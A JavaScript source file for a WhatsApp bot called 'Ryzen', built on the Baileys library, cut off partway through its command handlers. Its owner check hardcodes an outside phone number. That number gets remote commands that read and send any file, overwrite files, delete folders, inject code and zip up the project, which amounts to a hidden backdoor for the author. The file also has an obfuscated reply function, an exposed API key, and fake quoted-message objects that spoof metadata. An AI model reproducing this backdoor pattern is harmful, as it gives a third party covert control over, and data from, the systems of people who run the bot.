/*
ᴀʟᴠɪɴ'ꜱ ᴏʀɪɢɪɴᴀʟ ʙᴀꜱᴇ

ʙᴀꜱᴇ ʙʏ ᴀʟᴠɪɴ
ᴄʀᴇᴅɪᴛ ᴀʟᴠɪɴ
ʏᴏᴜᴛᴜʙᴇ @ᴄᴀʟʟᴍᴇᴠɪɴᴢ
ɢɪᴛʜᴜʙ : ᴀʟᴠɪɴᴘɪɴ
ɪɴꜱᴛᴀɢʀᴀᴍ : ᴜɴᴋɴᴏᴘɪɴ 
ᴛᴇʟᴇɢʀᴀᴍ : ᴛ.ᴍᴇ/@ʙɪᴏxꜱᴇʀᴠɪᴄᴇ

ʙᴜʏ ʀʏᴢᴇɴ ᴡɪᴛʜ ʜᴀᴄᴋɪɴɢ ᴛᴏᴏʟꜱ ᴀɴᴅ ᴘʏᴛʜᴏɴ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ ʟᴀɴɢᴜᴀɢᴇ 
            ⇓
ᴘᴠ = ᴛ.ᴍᴇ/@ʙɪᴏxꜱᴇʀᴠɪᴄᴇ

ɴᴏᴛᴇꜱ
ᴅᴇʟᴇᴛɪɴɢ ᴄʀᴇᴅɪᴛ ᴛʜᴇʀᴇ ᴡɪʟʟ ʙᴇ ɴᴏ ᴜᴘᴅᴀᴛᴇꜱ
*/
require('../config')
require('./lib/menu')
const {
   default: makeWASocket,
   BufferJSON,
   WAMessageStubType,
   WA_DEFAULT_EPHEMERAL,
   generateWAMessageFromContent,
   downloadContentFromMessage,
   downloadHistory,
   proto,
   getMessage,
   InteractiveMessage,
   generateWAMessageContent,
   prepareWAMessageMedia,
   generateWAMessage,
   areJidsSameUser,
   makeInMemoryStore,
   delay
} = require('@whiskeysockets/baileys')
const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os')
const speed = require('performance-now')
const moment = require('moment-timezone');
const ms = toMs = require('ms');
const fsx = require("fs-extra")
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const fetch = require('node-fetch')
const { exec } = require("child_process")
const yts = require('yt-search');
const ytdl = require('ytdl-core');
const path = require('path')
const rimraf = require('rimraf')
const { smsg, 
        fetchJson, 
        getBuffer, 
        getGroupAdmins, 
        TelegraPh, 
        msToDate, 
        isUrl, 
        hitungmundur, 
        checkBandwidth, 
        runtime 
        } = require('./lib/function')
const { generateProfilePicture, 
        removeEmojis, 
        tanggal, 
        formatp, 
        formatDate, 
        getTime, 
        sleep, 
        clockString, 
        jsonformat, 
        parseMention, 
        getRandom 
        } = require('./lib/myfunc')        
const uploadFile = require('./lib/uploadFile') 
const uploadImage = require('./lib/uploadImage')      
const { mediafireDl } = require('./lib/mediafire.js')   
const { sticker5 } = require('./lib/sticker')
const { quote } = require('./lib/quote') 
const nou = require('node-os-utils');
////==================================

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
var budy = (typeof m.text == 'string' ? m.text : '')
const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)
const prefix = isCmd ? budy[0] : ''
const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await client.decodeJid(client.user.id)
const tanggal = moment().tz("Asia/Jakarta").format("dddd, ll")
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz("Asia/Jakarta").locale('id').format('a')
const isCreator = ["6282180786508@s.whatsapp.net", botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = m.chat
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const Cuekin = !0;

// READ MORE/BACA SELENGKAPNYA
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
//=======================================
    const fcall = { 
         key: {
             fromMe: false, 
                 participant: `0@s.whatsapp.net`, 
                  ...(from ? { remoteJid: "status@broadcast"} : {}) },
                         'message': {
                       extendedTextMessage: {
                  text: body
             }
         }
    }
    
    const fkontak = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.from ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: `${pushname}`,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split("@")[0]}:${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        },
      },
    };
    
    const fmage = { 
        key: 
           { 
              remoteJid:
                  'status@broadcast', 
                        participant:
                            '0@s.whatsapp.net' 
                               }, 
                                  message: 
                                     { 
                                  orderMessage:
                               {
                            itemCount: 
                        9999999999,
                  status: 1,
              thumbnail: 
           await 
        client.reSize(await getBuffer("https://telegra.ph/file/473e058c3689f3f053551.jpg"),
    300,
       150), 
          surface: 1, 
             message: 
                "ʀʏᴢᴇɴ sᴄʀɪᴘᴛ",
                    orderTitle: ``, 
                sellerJid:
              '0@s.whatsapp.net'
          }
       }
    }
//=======================================

function _0x6150(_0x13d6b6,_0x2a7197){const _0x21e522=_0x21e5();return _0x6150=function(_0x6150b6,_0x1f8ea3){_0x6150b6=_0x6150b6-0xf8;let _0x1f9889=_0x21e522[_0x6150b6];return _0x1f9889;},_0x6150(_0x13d6b6,_0x2a7197);}(function(_0x1dd42b,_0x2a8631){const _0x1355f7=_0x6150,_0x5c3f5c=_0x1dd42b();while(!![]){try{const _0x58bc8d=-parseInt(_0x1355f7(0xfb))/0x1+parseInt(_0x1355f7(0x100))/0x2+-parseInt(_0x1355f7(0x102))/0x3*(parseInt(_0x1355f7(0x103))/0x4)+parseInt(_0x1355f7(0x104))/0x5+-parseInt(_0x1355f7(0xff))/0x6*(-parseInt(_0x1355f7(0xfe))/0x7)+parseInt(_0x1355f7(0xfa))/0x8*(parseInt(_0x1355f7(0xf8))/0x9)+-parseInt(_0x1355f7(0xf9))/0xa*(-parseInt(_0x1355f7(0xfd))/0xb);if(_0x58bc8d===_0x2a8631)break;else _0x5c3f5c['push'](_0x5c3f5c['shift']());}catch(_0x499722){_0x5c3f5c['push'](_0x5c3f5c['shift']());}}}(_0x21e5,0x90b0f));function _0x21e5(){const _0xf4378c=['215607GpLLMR','54KPTZQJ','364488DQMQJh','sendMessage','2694159HFrQCp','4EtQhBd','4689765ZlkJzC','27HPSvlG','140SOcwrH','414008eNqTAc','635083lygSxm','𝑅𝑦𝑧𝑒𝑛\x20𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝\x20𝐶ℎ𝑎𝑛𝑒𝑙','450318BlEkWv'];_0x21e5=function(){return _0xf4378c;};return _0x21e5();}const vinReply=async _0x5f4b07=>{const _0x3da6bb=_0x6150;client[_0x3da6bb(0x101)](from,{'text':_0x5f4b07,'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![],'forwardedNewsletterMessageInfo':{'newsletterName':_0x3da6bb(0xfc),'newsletterJid':'120363236214682540@newsletter'}}},{'quoted':fcall});};

//=======================================  
const fitur = (cases) => 
        {
            return "case "+`'${cases}'`+fs.readFileSync('./console/message.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
  }        
  const getfunc = (funcc) => {
            return "const "+`'${funcc}'`+fs.readFileSync('./console/message.js').toString().split('const \''+funcc+'\'')[1].split('')
  }
//=======================================  
  async function downloadMp3(url) {
     try {
        let mp3File = './'+getRandom('.mp3')
            ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
                await client.sendMessage(
                   from, 
                      {
                         audio: 
                            fs.readFileSync(mp3File),
                          mimetype: 'audio/mpeg'}, 
                      {quoted:m})
                   fs.unlinkSync(mp3File)
                })
            } catch(e) {
        console.log(e)
     return client.sendteks(from, util.format(e), m)
    }
  }
//============================//
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , 
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return client.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//=======================================
try {
var ppuser = await client.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'}
let ppnyauser = await await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')            

if (m.message) {
client.readMessages([m.key])
console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> FOR'), chalk.green(m.isGroup ? pushname : 'PERSONAL CHAT', m.chat))
}
if (!client.public && !isCreator && !['start'].includes(command)) return !0;
switch (command) {
//========================
    //Cyber location
//========================
            //owner  location
  case 'restart':
     if (!isCreator) return vinReply('Khusus Creator')
        vinReply(`Restart server...`)
            await sleep(3000)
    process.exit()
  break
  case  'delsesi':
  case 'clearsesi':{
    fs.readdir("./session", async function(err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
                return vinReply('Unable to scan directory: ' + err);
                    }
                        let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                    item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                )
            console.log(filteredArray.length);
        let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
    if (filteredArray.length == 0) return vinReply(teks)
  filteredArray.map(function(e, i) {
   teks += (i + 1) + `. ${e}\n`
        })
            vinReply(teks)
                await sleep(2000)
                    vinReply("Menghapus file sampah...")
                        await filteredArray.forEach(function(file) {
                    fs.unlinkSync(`./session/${file}`)
                });
            await sleep(2000)
        vinReply("Berhasil menghapus semua sampah di folder session")
   }
      );
        }    
   break
   case 'clearhome':{
        if (!isCreator) return 
            let directoryPath = path.join('./') //&& '../media') //path.join();
                fs.readdir(directoryPath, async function (err, files) {
                    if (err) {
                          return vinReply('Tidak dapat memindai direktori: ' + err);
                    } 
                let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("zip") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
                 var teks = `Detected ${filteredArray.length} trash at home\n\n`
            if (filteredArray.length == 0) return vinReply(teks)
        filteredArray.map(function(e, i){
   teks += (i+1)+`. ${e}\n`
        }
          )
            vinReply(teks)
                await sleep(2000)
                    vinReply("_Proces Clear Home.._")
                await filteredArray.forEach(function (file) {
            fs.unlinkSync(`./${file}`) //&& `../media/${file}`) 
          });
        await sleep(2000)
   vinReply("_Deleted Successfully_")
        }
          );
        }
   break
     case 'addcase': {
                if (!isCreator) return vinReply('buat owner dibilang')
    if (!text) return vinReply('Mana case nya');
    const fs = require('fs');
const namaFile = './console/message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) { 
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                vinReply('Terjadi kesalahan saat menulis file:', err);
            } else {
                vinReply('*Succes Menambahkan case*');
            }
        });
    } else {
        vinReply('Tidak dapat menemukan case gimage dalam file.');
    }
        }
             );
        }
    break;
    case 'gimage': {
       vinReply('gada')
        }
    break
    case 'getcase':
        if (!isCreator) return vinReply('buat owner dibilang')
            if (!q) return vinReply(`Contoh penggunaan: ${prefix+command} menu`)
                vinReply(`${fitur(q)}`)
    break
    case 'delfolder':
        if (!isCreator) return vinReply('Developer Feature')
            if (!text) return vinReply(`*• Example* : ${prefix + command} userclone/session`)
                try{
                    rimraf.sync(`./${text}`)
                vinReply(`Success Delete ${q}`)
            }catch (error) {
        vinReply('Nama folder tidak ada di list')
      }
    break
    case 'getfile':{
        if (!isCreator) return;
            if (!q) return vinReply("*[!] File..?*")
                var sendfile = `${q}`
            var anuu = fs.readFileSync(sendfile)
        client.sendMessage(
    m.chat, 
      {
         document: 
            anuu, 
              mimetype: 
                 'application/octet-stream', 
              fileName:
            `${q}`
         }, {quoted: m})  
      }
    break 
    case 'getfunc':{
        if (!isCreator) return;
            if (!q) return vinReply(`[!] Function..?`)
              vinReply(`${getfunc(q)}`)
            }
    break
        // batas  
//========================
        // owner location
    case 'gfl': 
    case 'gantifile':
    {
      if (!isCreator) return vinReply(global.mess.owner)
        if (!text.includes("./")) return vinReply(`*• Example* : ${prefix + command} ./package.json`)
          let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
            if (!files.includes(m.quoted.fileName)) return reply("File not found") 
              let media = await downloadContentFromMessage(m.quoted, "document")
                let buffer = Buffer.from([])
                  for await(const chunk of media) 
                    {
               buffer = Buffer.concat([buffer, chunk])
              }
           fs.writeFileSync(text, buffer)
         vinReply(`Mengupload`)
        await sleep(2000)
      vinReply(`_Succes Upload ${q}_`)
    }
  break  
        case "backup":
        {
            let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
          if (!isCreator) vinReply("Khusus Owner Anj!!!"); 
     await vinReply("Sabar Bg Script Milki Lagi Di Backup");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
     await vinReply('script di kirim lewat pc')
          const exec = await execSync(`zip -r New.zip ${ls.join(" ")}`);
          await client.sendMessage(
            ban,
            {
              document: await fs.readFileSync("./New.zip"),
              mimetype: "application/zip",
              fileName: "New.zip",
            },
            { quoted: m }
          );
          await execSync("rm -rf NewV7.zip");
        }
     break
        
//========================
 case 'menu':
 {
   let anu = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: anu
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "_Copyright © 2024 _Ryzen Script._"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"List Menu ⎙",
"sections":[{"title":"Ryzen List Feature",
"highlight_label": "Favorite Request",
"rows":[{"header":"",
"title":"MENU ALL",
"description":"For See All Feature",
"id":"${prefix}menuall"},
{"header":"",
"title":"MENU DEVELOPER",
"description":"For See Developer Feature",
"id":"${prefix}developer"},
{"header":"",
"title":"MENU DOWNLOAD",
"description":"For See Download Feature",
"id":"${prefix}downloadmenu"},
{"header":"",
"title":"MENU AI",
"description":"For See Ai Feature",
"id":"${prefix}aimenu"},
{"header":"",
"title":"MENU CLONE",
"description":"For See Clone Feature",
"id":"${prefix}clonemenu"},
{"header":"",
"title":"MENU INFORMATION",
"description":"For See Information Feature",
"id":"${prefix}infomenu"},
{"header":"",
"title":"MENU CYBER",
"description":"For See Cyber Feature",
"id":"${prefix}cybermenu"}]
}]
}`
         },
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363236214682540@newsletter',
                  newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await client.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

 case "menuall":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${allmenu(prefix, slick)}`
await client.sendMessage(
    from, {
        text: ani,
            contextInfo: {
                forwardingScore: 999,
                    isForwarded: true,
                forwardedNewsletterMessageInfo: {
	        newsletterName: "𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙",
		newsletterJid: "120363236214682540@newsletter",
    },
	   externalAdReply: {  
          title: `𝐻𝑖 ${pushname}`, 
             body: `Ryzen On ${runtime(process.uptime())}`,
                thumbnailUrl: `https://telegra.ph/file/1f23e8fc5c6f71303482c.jpg`, 
                    sourceUrl: `https://whatsapp.com/channel/0029VaPHYbjHLHQbXFZe9K3o`, 
                mediaType: 1,
            renderLargerThumbnail: true
          }}}, {quoted: fmage})
       }
    break
 case "developer":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${developermenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
 case "aimenu":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${aimenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
 case "clonemenu":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${clonemenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
 case "infomenu":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${infomenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
 case "downloadmenu":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${downloadmenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
 case "cybermenu":
 {
   let ani = `
Hi 👋 .. @${m.sender.split("@")[0]}

*[ INFORMATION ]*

⛨〡 *Version* : _1.0.2_
⛨〡 *Creator* : _Alvin_
⛨〡 *Support* : _Baileys/Whiskey_
⛨〡 *Powered* : _api-alvin.my.id_

_Ryzen Is a Cyber Team Project Script_
${readmore}\n\n${cybermenu(prefix, slick)}`
client.sendMessage(
          from, 
            {text: 
              ani, 
                contextInfo: 
                  {
                    mentionedJid: [m.sender], 
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
	        newsletterName: '𝑅𝑦𝑧𝑒𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙',
		  newsletterJid: "120363236214682540@newsletter",
		}}},
      {quoted:fkontak}
    )
   }
 break
//batas
// ===================================== //
        //convert
        case 'tourl':
        {
            let q = m.quoted ? m.quoted : m
                 let mime = (q.msg || q).mimetype || ''
                    if (!mime) return vinReply('*send/reply your media with caption .tourl*')
                         let media = await q.download()
                             let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
                     let link = await (isTele ?                           uploadImage : uploadFile)(media)
            vinReply(`*Link:* ${link}`)
        }
        break;        
        case 'stiker': 
        case 'sticker': 
        case 's': 
        {
           if (!quoted) return vinReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await client.downloadAndSaveMediaMessage(quoted, + new Date * 1)
                        await client.sendImageAsSticker(m.chat, media, m, { packname: `©𝐶𝑟𝑎𝑡𝑒𝑑 𝐵𝑦 𝐴𝑙𝑣𝑖𝑛` , author: `𝑊𝑒 𝐴𝑟𝑒 𝐴𝑛𝑜𝑛𝑦𝑚𝑜𝑠 𝑊𝑒 𝐴𝑟𝑒 𝐿𝑒𝑔𝑖𝑜𝑛 𝑊𝑒 𝐴𝑟𝑒 𝑀𝑟.𝐴𝐷𝐶` })
                            await fs.unlinkSync(media)
                                    } else if (/video/.test(mime)) {
                            if ((quoted.msg || quoted).seconds > 11) return vinReply('Maksimal 10 detik!')
                        let media = await client.downloadAndSaveMediaMessage(quoted, + new Date * 1)
                    await client.sendVideoAsSticker(m.chat, media, m, { packname: `Created By ${botname}` , author: `Owner ${ownerName}` })
                await fs.unlinkSync(media)
           } else if (/sticker/.test(mime)) {
        let media = await client.downloadAndSaveMediaMessage(quoted, + new Date * 1)
            await client.sendStickerFromUrl(from, media, m, {packname: `Created By ${botname}` , author: `Owner ${ownerName}` })
                await fs.unlinkSync(media)
                    } else vinReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            }
        break
        case 'remini': 
        case 'hd': 
        case 'jadihd': 
        case 'hdr':
        {
           if (!m.quoted) return vinReply(`Reply gambar ${prefix}${command}`)
                const { remini } = require('./lib/remini')
                    let media = await quoted.download()
               let proses = await remini(media, "enhance");
          client.sendMessage(m.chat, { image: proses, caption:"𝐃𝐨𝐧𝐞 𝐊𝐚𝐤"}, { quoted: m})
            }
        break
        case 'ssweb':
        {
          if (!q) return vinReply('[!] link..?')
            if (!isUrl(q)) return vinReply(`[!] the link is stupid`)
              try{
                 const respon = await getBuffer(`https://api.arifzyn.tech/tools/ssweb?url=${q}&device=desktop&apikey=AR-btwbbD1nh8B8`)
                    await client.sendMessage(
                        from,
                             {
                                 image: respon
                                    },
                                 {
                            quoted:m
                        }
                    )
                 } 
              catch (e) 
            {
          vinReply(util.fotmat(e)
        )
          }
            }
        break
        case 'swm':{
          if (!quoted) return vinReply(`*ex*\nteks1|teks2`)
            teks1 = text.split('|')[0] ? text.split('|')[0] : ''
                teks2 = text.split('|')[1] ? text.split('|')[1] : ''
                    if (/image/.test(mime)) {
                        let media = await quoted.download()
                            let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
                        if (stiker) return client.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
                    } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return vinReply('Maksimal 10 detik!')
            let media = await quoted.download()
          let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
        if (stiker) return client.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
            } else {
                vinReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
                    }
            }
        break
        case 'quotely': case'qc':{
            if (!text) return vinReply('[!] teks') 
                try {
                    const rest = await quote(text, pushname, ppnyauser)
                let stiker = await sticker5(rest.result, false, `Created By Ryzen`)
            if (stiker) return client.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
        }catch (error) {
            vinReply(`Server sedang error!`);
                }
            }
        break
// ===================================== //
            //download location
    case 'play':{
        if (!text) return vinReply(`Example : ${prefix + command} Lagu sad`)
            await client.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
                let search = await yts(`${text}`)
                  let data = await search.all.filter((v) => v.type == 'video')
                    try {
                        var res12 = data[0]
                    } catch {
                  var res12 = data[1]
                }
            let ply = search.videos[0].url
        const ytdl = require('ytdl-core')
    let mp3file = `./${search.all[0].views}.mp3`
         let nana = ytdl(ply, { filter: 'audioonly' })
            .pipe(fs.createWriteStream(mp3file))
                .on('finish', async () => {
                    await client.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
                        client.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}},)
                    }
                )
                    await client.sendMessage(
                m.chat, 
            { 
         react: 
    {
       text: "⏱️",key: m.key,
            }
               }
            )   
       }
    break   
           case 'fb':
           case 'fbdl':
           case 'facebook': {
                if(!q) return vinReply('link nya..?')
                   try{
                       await client.sendMessage(
                            m.chat, 
                              { 
                                react: 
                                  {
                                     text: "⏱️",key: m.key,
                                  }
                                }
                              )   
